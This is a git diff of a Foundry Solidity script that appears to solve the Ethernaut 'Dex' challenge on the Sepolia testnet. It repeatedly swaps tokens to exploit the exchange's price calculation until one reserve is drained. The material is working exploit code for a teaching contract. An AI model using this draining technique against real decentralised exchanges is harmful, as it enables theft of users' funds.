@@ -6,7 +6,7 @@ import "forge-std/console.sol";
 import {Dex} from "../src/Dex.sol";
 
 // $ source .env      # This is to store the environmental variables in the shell session
-// $ forge script script/Dex.s.sol --tc DexSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv
+// $ forge script script/Dex.s.sol --tc DexSolution --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
 
 contract DexSolution is Script {
     // get the environmental variables
@@ -30,19 +30,19 @@ contract DexSolution is Script {
 
     function run() external {
         vm.startBroadcast(deployerPrivateKey);
-        Dex dex = Dex(instance);
-        address token1 = dex.token1();
-        address token2 = dex.token2();
+        Dex dexInstance = Dex(instance);
+        address token1 = dexInstance.token1();
+        address token2 = dexInstance.token2();
         // approve the contract to spend the tokens
-        dex.approve(address(this), type(uint256).max);
+        dexInstance.approve(instance, type(uint256).max);
         // start swapping until we drain one of the tokens
         uint256 token1Reserve;
         uint256 token2Reserve;
         while (true) {
-            token1Reserve = dex.balanceOf(token1, instance);
-            token2Reserve = dex.balanceOf(token2, instance);
-            uint256 userToken1Balance = dex.balanceOf(token1, myAddress);
-            uint256 userToken2Balance = dex.balanceOf(token2, myAddress);
+            token1Reserve = dexInstance.balanceOf(token1, instance);
+            token2Reserve = dexInstance.balanceOf(token2, instance);
+            uint256 userToken1Balance = dexInstance.balanceOf(token1, myAddress);
+            uint256 userToken2Balance = dexInstance.balanceOf(token2, myAddress);
 
             console.log("Token1 Reserve: ", token1Reserve);
             console.log("Token2 Reserve: ", token2Reserve);
@@ -56,23 +56,23 @@ contract DexSolution is Script {
             // swap the one with the most balance
             if (userToken1Balance >= userToken2Balance) {
                 // using all the user token1 balance
-                uint256 Amount2Out = dex.getSwapPrice(token1, token2, userToken1Balance);
+                uint256 Amount2Out = dexInstance.getSwapPrice(token1, token2, userToken1Balance);
                 // if the amount is more than the reserve, we need to use the reserve instead
                 if (Amount2Out > token2Reserve) {
                     // swap with the reserve 1 as the Input amount
-                    dex.swap(token1, token2, token1Reserve);
+                    dexInstance.swap(token1, token2, token1Reserve);
                 } else {
-                    dex.swap(token1, token2, userToken1Balance);
+                    dexInstance.swap(token1, token2, userToken1Balance);
                 }
             } else {
                 // using all the user token1 balance
-                uint256 Amount1Out = dex.getSwapPrice(token2, token1, userToken2Balance);
+                uint256 Amount1Out = dexInstance.getSwapPrice(token2, token1, userToken2Balance);
                 // if the amount is more than the reserve, we need to use the reserve instead
                 if (Amount1Out > token1Reserve) {
                     // swap with the reserve 1 as the Input amount
-                    dex.swap(token2, token1, token2Reserve);
+                    dexInstance.swap(token2, token1, token2Reserve);
                 } else {
-                    dex.swap(token2, token1, userToken2Balance);
+                    dexInstance.swap(token2, token1, userToken2Balance);
                 }
             }
         }
